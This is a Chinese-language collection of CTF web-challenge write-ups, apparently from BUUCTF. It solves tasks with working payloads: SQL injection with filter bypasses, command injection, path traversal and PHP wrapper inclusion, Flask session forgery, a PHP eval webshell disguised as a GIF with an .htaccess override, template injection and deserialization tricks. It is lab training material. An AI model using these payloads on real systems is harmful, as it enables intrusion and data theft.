## [极客大挑战 2019]EasySQL

```
# 万能公式
1 and 1=1
1' and '1'='1
1 or 1=1 
1' or '1'='1

```

用万能密码登录**1' or  '1'='1**

![image-20230412190347772](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412190347772.png)

## [极客大挑战 2019]Havefun

查看网页源代码，get方式传入cat=dog即可

## [HCTF 2018]WarmUp

查看源代码，得到提示

![image-20230412191003372](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412191003372.png)

对源码进行解析

```
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            //条件一：page的值为空或者不是字符串，那么不通过
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
			//条件二：page的值在白名单中，则通过
            if (in_array($page, $whitelist)) {
                return true;
            }
			//返回page中从第0位开始到第一个？出现的位置，之间的值赋给page
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')//查找字符串在另一个字符串中首次出现的位置
            );
            //条件三：page中?之前的值在白名单中，则通过
            if (in_array($_page, $whitelist)) {
                return true;
            }
			//将url编码后的字符串还原成未编码的样子，然后赋值给page
            $_page = urldecode($page);
            //返回page中从第0位开始到第一个？出现的位置，之间的值赋给page
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')//查找字符串在另一个字符串中首次出现的位置
            );
            //条件四：page还原成未编码之后，?前面的值是否在白名单内，是则通过
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
	//以上条件满足一个则结果包含file
    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
//这一坨代码，告诉我们，你输入的payload不为空，是字符串，且前面那个函数返回是ture，
//才能给你include包含文件。这也是为什么我们file=后面要先接一个hint.php或者resource.php
?> 
```

从hint.php开始，../五个，读取文件

![image-20230412191836788](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412191836788.png)

题外话

```
这和linux系统是一样的， 

. 表示当前目录
.. 表示当前目录的上一级目录。
./表示当前目录下的某个文件或文件夹，视后面跟着的名字而定
../表示当前目录上一级目录的文件或文件夹，视后面跟着的名字而定。

例如：
文件夹 a
下面有  文件夹b c 和文件 d。
文件夹b下面有e.php 和文件f。

则e中的 . 表示 文件夹b
./f 表示b下面的文件f。
..  表示a文件夹。
../d 表示a文件夹下的d文件。
```

## [ACTF2020 新生赛]Include

题目提示包含漏洞

利用PHP封装协议：
php://filter/read=convert.base64-encode/resource=xxx.php

![image-20230412192213420](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412192213420.png)

得到base64解码得到flag

## [ACTF2020 新生赛]Exec

常见管道符直接执行命令。

```
1. | （按位或），直接执行|后面的语句
2. || （逻辑或），如果||前面的语句是错误的，则执行后面的语句，否则的话只执行前面的语句
3. & （按位与），无论&前后的语句真假，都要执行
4. && （逻辑与），若前面的语句为假，则后面的语句也不执行；若前面的语句为真则执行前后两条语句
5. ; (作用和&一样)
```

![image-20230412193305228](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412193305228.png)

## [强网杯 2019]随便注

输入1和2都回显正常

输入

```
1' order by 3 #
```

出现报错

![image-20230412193723936](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412193723936.png)

说明字段有两位，尝试联合注入查询

```
1' union seclet 1,2#
```

不行，过滤了**select|update|delete|drop|insert|where|\./i**

我们尝试堆叠注入，原理很简单，就是通过 ; 号注入多条SQL语句。

```
1';show databases; #
```

![image-20230412194247241](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194247241.png)

爆表名**1'; show tables;#**

![image-20230412194440570](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194440570.png)

查表的字段**1';show columns from words;#**

**1'; show columns from `1919810931114514`;#**
**注意：表名为数字时，要用`包起来查询。**

![image-20230412194738125](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194738125.png)

flag 找到了，该怎么查看数据呢

方法一：改名换姓

我们可以“改名换姓”把1919810931114514表名改成words表，仅如此还不够，由于words表有两个字段，我们需要把新的words表也变成两个字段

```
1'; rename table words to word1; rename table '1919810931114514' to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#
```

方法二：关键字编码绕过

select被过滤了，那么我们可以绕过这个过滤（16进制编码）

```
1';SeT@a=0x<这里填查询语句的十六进制代码>;prepare execsql from @a;execute execsql;#
也就是：
1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
```

方法三：关键字过滤之等价函数替换

查询语句除了我们常用的“SELECT”语句以外还有HANDLER。并且在官方的说明中“HANDLER查询性能比SELECT更好”所以我们可以直接换个查询函数赛。（我不李姐）

```
1'; handler `1919810931114514` open as flag; handler flag read next;#
```

![image-20230412195335176](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195335176.png)

## [GXYCTF2019]Ping Ping Ping

题目提示ping

```
127.0.0.1;ls
```

![image-20230412195655093](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195655093.png)

```
127.0.0.1;cat flag.php
```

![image-20230412195808644](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195808644.png)

提示过滤了空格（f*uk）

空格绕过

```
${IFS}替换
$IFS$1替换
${IFS替换
%20替换
<和<>重定向符替换
%09替换
```

查看一下源代码

![image-20230412200159641](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412200159641.png)

这里 匹配一个字符串中，是否按顺序出现过flag四个字母。所以不能有flag。那我们进行绕过

变量绕过

```
?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```

然后查看网页源代码得到flag

![image-20230412200708343](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412200708343.png)

## [HCTF 2018]admin

打开题目，查看源代码

![image-20230419201617706](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419201617706.png)



提示我不是admin

尝试注册admin,提示已被注册

先随便注册一个账号进去看看，

![image-20230419201848848](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419201848848.png)

在**修改密码页面**，查看源代码，发现github上的源码

![image-20230419202007017](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419202007017.png)

可惜404了

![image-20230419202037199](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419202037199.png)

找别人博客看吧

姿势一：弱口令爆破一波,因为是个弱口令(123),爆破也能爆破出来，**admin,123**得到flag

弱口令不行的话就试试**sql注入**,抓包看看，有一个session

姿势二：

session伪造（flask）

```
Session 和 Cookie 功能效果是差不多的，区别就是session 是记录在服务端的，Cookie是记录在客户端的
但flask的session保存在客户端，我们需要找到密钥来对session进行解码来获取其中的用户数据
```

找到session

![image-20230419203729050](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419203729050.png)

再找一个来处理session的脚本

https://github.com/noraj/flask-session-cookie-manager

简单用法：

decode -c "session"

![image-20230419203908894](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419203908894.png)

```
{"_fresh":true,"_id":{" b":"YjEwZjBiZmQ4Mjg3MjE5M2MyYjFjNTU4MDQ1ZWQyM2UyOTk2NTdkOGVmMmRiMDM1MGVlMmQwNzA4Y2Y5YTI2MjI5ZTAzOWQyZDU4MDVhMDIzN2I1Nzg2ZTQ3OWZiMWRlNTAzYjE4YmU3NzMyM2VlMmI3Y2RiM2Q1ZGEwOGIwN2Y="},"csrf_token":{" b":"MDhmM2VhZmMxY2RhZDNhNGQzZGE5ZTJlNzk2ODIwODcxYmU1M2YwYg=="},"image":{" b":"NW94Sw=="},"name":"1","user_id":"10"}
```

将用户名name改为admin

加密时一直报错

![image-20230419204301393](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204301393.png)

找了一个decode脚本

```
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode
def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)
    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True
    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')
    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')
    return session_json_serializer.loads(payload)
if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```

![image-20230419204440482](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204440482.png)

发现这个用的是单引号那个是双引号
 同时这个把base64直接解码了

再进行encode

用法：encode -s "钥匙" -t "明文"

钥匙在源码找到的

![image-20230419204726351](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204726351.png)

![image-20230419204645536](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204645536.png)

修改session的值，刷新就行

![image-20230419204835926](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204835926.png)

姿势三：Unicode欺骗

![image-20230419205242000](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419205242000.png)

发现注册和登录以及修改密码处只是对数据进行了**strlower()函数**小写化，在末尾查看函数

**strlower()函数**的作用是小写化name

![image-20230419205333918](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419205333918.png)

**nodeprep.prepare**这个方法是将大写字母转换成小写字母，但是它存在一个问题：它会将unicode编码的ᴬ转化成A，而A在调用一次nodeprep.prepare函数会把A转换成a

这个字符可以在后面网站找到，https://unicode-table.com/en/1D2E/

1.如果用ᴬᴰᴹᴵᴺ注册，注册经过处理，储存在数据库就变成了 ADMIN

2.登录后，加密储存在session 的也是ADMIN

3.修改密码后，取出session进行解密name也是ADMIN

4.再调用一次strlower函数就变成了admin

5.这时admin 的密码就变成了自定义修改后的密码。登录后就得到 flag 。

## [MRCTF2020]你传你🐎呢

先上传一句话木马。并且将下面的内容保存成文件2.png

内容：

```php
GIF89a? 
<script language="php">eval($_POST['hack']);</script>
```

直接上传成功了![image-20230420141955359](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420141955359.png)



用蚁剑还是连不上

**.htaccess是什么**

启用.htaccess需要修改httpd.conf（Apache里的）

```
.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。
```

写一个.htaccess文件，将其他类型的文件转化成php文件

```
<FilesMatch "2.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

接着我们再上传.htaccess文件，抓包，Content-Type更改成image/png

蚁剑连接2.png即可 路径：/upload/94e1b5d8a172dee319d653594cff56e6/2.png

根目录找到flag

![image-20230420143227755](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143227755.png)

## [护网杯 2018]easy_tornado

有三个文件

/flag.txt

![image-20230420143534518](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143534518.png)

/welcome.txt

![image-20230420143547654](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143547654.png)

/hints.txt

![image-20230420143640993](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143640993.png)

提示flag在/fllllllllllllag里，filehash=md5(cookie_secret+md5(/fllllllllllllag))

根据题目easy_tornado可推测是服务器模板注入

需要找到cookie_serect

注入`{{handler.settings}}`查看配置文件，得到cookie_secert

![image-20230420144517901](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420144517901.png)



接着进行MD5加密

payload：

```
?filename=/fllllllllllllag&filehash=90464389fd908f5db3eb64d0f42e2048
```

![image-20230420144930047](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420144930047.png)

## [SUCTF 2019]EasySQL

输入1，回显：

```
Array ( [0] => 1 ) 
```

输入1‘ and1=1啥的回显Nonono

大佬直接猜出源码是：select $_POST[‘query’] || flag from Flag

当输入*,1时，此时语句为：select *,1 from Flag，1是新增一列，

*是所有。

![image-20230420145818503](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420145818503.png)

另一种姿势：

先查看数据库

```
1;show databases;#
```

查看表

```
1;show tables;#
```

 查看字段值，这里出问题了。过滤了好多东西

看别人的

```
1;set sql_mode=PIPES_AS_CONCAT;select 1
```

set sql_mode=PIPES_AS_CONCAT;的作用是将||的功能从 或运算（or） 改为 字符串拼接，修改之后这个 || 相当于是将select 1 和 select flag from Flag 的结果拼接在一起。

![image-20230420150432516](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150432516.png)

## [极客大挑战 2019]Secret File

打开，找到信息

![image-20230420150549216](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150549216.png)

看到

![image-20230420150637831](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150637831.png)

点一下这个，很快闪过去了

我们抓包仔细看看

![image-20230420150851373](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150851373.png)

访问它

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0); //报错回显
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    } //strstr函数搜索在另一字符串的第一次出现
    include($file); 
//flag放在了flag.php里
?>
```

使用filter协议读取flag.php，base64解密

![image-20230420151709003](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420151709003.png)

## [极客大挑战 2019]LoveSQL

万能密码能进

```sql
1' or 1=1#
```

但不是flag

先查一下字段

```sql
admin' order by 3# //无报错
admin' order by 4# //有报错
```

![image-20230420152713873](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420152713873.png)

联合查询

```
1'union select 1,2,3#
```

回显在2，3上

![image-20230420152917362](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420152917362.png)

看数据库

```sql
1'union select 1,database(),3#
```

![image-20230420152953584](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420152953584.png)

看表名

```
1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='geek'#
```

![image-20230420153129832](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420153129832.png)

看字段

```
group_concat(column_name) from information_schema.columns where table_schema='geek' and table_name='l0ve1ysq1'#
```

![image-20230420153259465](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420153259465.png)

看数据

```sql
group_concat(id,username,password) from l0ve1ysq1
```

有flag，geekuser没有flag

![image-20230420153428473](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420153428473.png)

## 极客大挑战 2019]Http

打开，发现信息

![image-20230420154629357](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420154629357.png)

```
It doesn't come from 'https://Sycsecret.buuoj.cn'
Please use "Syclover" browser
No!!! you can only read this locally!!!
```

http头：referer:https://Sycsecret.buuoj.cn

User-Agent: Syclover

X-Forwarded-For:127.0.0.1

flag

![image-20230420155202935](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155202935.png)

## [极客大挑战 2019]Knife

命令查看

![image-20230420155510702](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155510702.png)

再查看源代码

![image-20230420155715714](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155715714.png)

蚁剑查看，在根目录看到flag

![image-20230420155620238](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155620238.png)

## [极客大挑战 2019]Upload

上传2.png，

![image-20230420155902462](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155902462.png)

更改后缀，发现2.phtml可以上传

![image-20230420155955895](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155955895.png)

上传路径应该是/upload/2.phtml

读取flag![image-20230420160227332](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160227332.png)

蚁剑连接，根目录找到flag

![image-20230420160354641](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160354641.png)

## [ACTF2020 新生赛]Upload

上传2.png，回显上传成功，抓包看看去

![image-20230420160551695](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160551695.png)

将后缀改为phtml成功上传

![image-20230420160713757](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160713757.png)

查看flag

![image-20230420160950257](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160950257.png)

## [极客大挑战 2019]BabySQL

尝试万能密码 1‘ or 1=1#

![image-20230420161222526](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420161222526.png)

报错了，or没了，or应该被过滤了

绕过方式

```
双写绕过，大小写绕过，||代替
```

1' || 1=1#  成功进入

![image-20230420161503565](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420161503565.png)

查字段数

```php
admin' oorrder bbyy 3 # //无报错
admin' oorrder bbyy 4 # //报错了
```

联合查询吧

```php
1' ununionion selselectect 1,2,3 #
```

看数据库

```
1' ununionion selselectect 1,database(),3 #
```

看表名

```php
1' ununionion seselectlect 1,database(),group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'#
```

![image-20230420162538553](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420162538553.png)

看字段

```
1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'#
```

![image-20230420162737699](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420162737699.png)

看数据

```
1' ununionion selselectect 1,database(),group_concat(id,username,passwoorrd) frfromom  b4bsql#
```

![image-20230420162823139](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420162823139.png)

## [极客大挑战 2019]PHP

他说他有一个备份的好习惯，看看www.zip和www.rar等

www.zip有东西

![image-20230420163114051](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420163114051.png)

查看了class.php，index.php

![image-20230420163856548](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420163856548.png)

有一个Name类，里面有两个私有属性，username，password，

我们需要将username=admin，password=100，序列化一下get方式提交

常用的内置方法：
 __ construct()：创建对象时初始化，当一个对象创建时被调用
 __ wakeup() 使用unserialize时触发
 __ sleep() 使用serialize时触发
 __ destruction()：结束时销毁对象，当一个对象销毁时被调用

看[php反序列化](http://t.csdn.cn/dXSFs)

```php
<?php
class Name
{
    private $username = 'admin';
    private $password = '100';

    public function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
    }
}
$a = new Name('admin','100');
echo (serialize($a));
?>
```

输出结果：

![image-20230420164157744](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420164157744.png)

在反序列化字符串时，属性个数的值大于实际属性个数时，会**跳过 __wakeup()函数**的执行

在Name和username前面有\0前缀，这与php的序列化方式有关。但在url提交payload的时候使用\0会被当成空白符丢失。因此要讲\0替换成%00。

原来的：

```
O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";s:3:"100";}
```

更改为：

```
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
```

payload：

```
?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
```

![image-20230420164607721](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420164607721.png)

## [ACTF2020 新生赛]BackupFile

找一下源文件

在index.php.bak里面（用dirsearch扫）

```
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

PHP弱类型比较绕过[看他](http://t.csdn.cn/SgTWa)

payload：

```
?key=123
```

**flag![image-20230420165407197](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420165407197.png)**

## [RoarCTF 2019]Easy Calc

找到信息

![image-20230420165522754](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420165522754.png)

用了一个WAF确保安全

```
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

过滤了很多字符.正常字符没办法直接使用，只能为数字。但是可以使用 ASCII码

绕过waf

![image-20230420165817333](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420165817333.png)

payload：

```
/calc.php? num=2;var_dump(scandir(chr(47)))
```

其中var_dump()用来打印；
 scandir（）用来获扫描目录下文件；
 chr（47）是“/”的ASCII编码

chr()函数可以是ASCLL码变成字符，ord()函数相反

file_get_contents() 是用于将文件的内容读入到一个字符串

发现

![image-20230420170107136](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420170107136.png)

读取一下看看

```
/calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

![image-20230420170248010](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420170248010.png)

## [极客大挑战 2019]BuyFlag

找到信息

```
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

is_numeric()函数，检测变量是否为数字或数字字符串

password不能是数字或数字字符串，并且password等于404即可

将user的值改为1，成为本校学生

![image-20230420185127185](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420185127185.png)

payload：

```
password=404%20&money=1e9
```

借助[url编码](https://so.csdn.net/so/search?q=url编码&spm=1001.2101.3001.7020)中的空字符，例如%00或者%20，比如404%20，404%00。还有在404后面加字符和符号也可以，例如：404a

![image-20230420185919916](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420185919916.png)

## [BJDCTF2020]Easy MD5

进去随便输几个数，没啥反应，看看包

![image-20230420190207016](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420190207016.png)

```
select * from 'admin' where password=md5($pass,true)
```

md5($pass,true)的意思是对pass进行16位原始二进制格式的字符串MD5，而mysql又会把这一串16位二进制解析成十六进制从而当做十六进制编码进行解析。所以我们要找到某一个字符串，16位md5之后变成’or‘的十六进制形式。

```
'or'的十六进制：276f7227
```

```
ffifdyop的md5：276f722736c95d99e921722cf9ed621c
```

输入后，跳到/levels91.php这，查看源码

```
<!--
$a = $GET['a'];
$b = $_GET['b'];
if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

科学计数法绕过

payload：

```
?a=QNKCDZO&b=s878926199a
```

跳到/levell14.php

```
 <?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```

MD5强类型绕过，用数组绕过

payload：

```
param1[]=1&param2[]=2
```

![image-20230420192000070](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420192000070.png)

## [ZJCTF 2019]NiZhuanSiWei

```
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```

useless.php文件，访问一下

啥也没有

isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf" 我们需要传入一个内容为welcome to the zjctf的文件，

data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取

payload：

```
data://text/plain,welcome to the zjctf
```

**welcome to the zjctf**

filter协议读取useless.php

```
PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
```

解码

```php
<?php  

class Flag{  //flag.php  提示了
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

```
<?php
class Flag{
    public $file='flag.php';
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
            return ("U R SO CLOSE !///COME ON PLZ");
        }
    }
}
$password=new Flag();
echo serialize($password);
?>
```

运行结果：

```
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

联合起来payload：

```
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

flag

```
<?php

if(2===3){  
	return ("flag{6633ed89-7eda-4de4-92c5-88bd8fdbe0c7}");
}
```

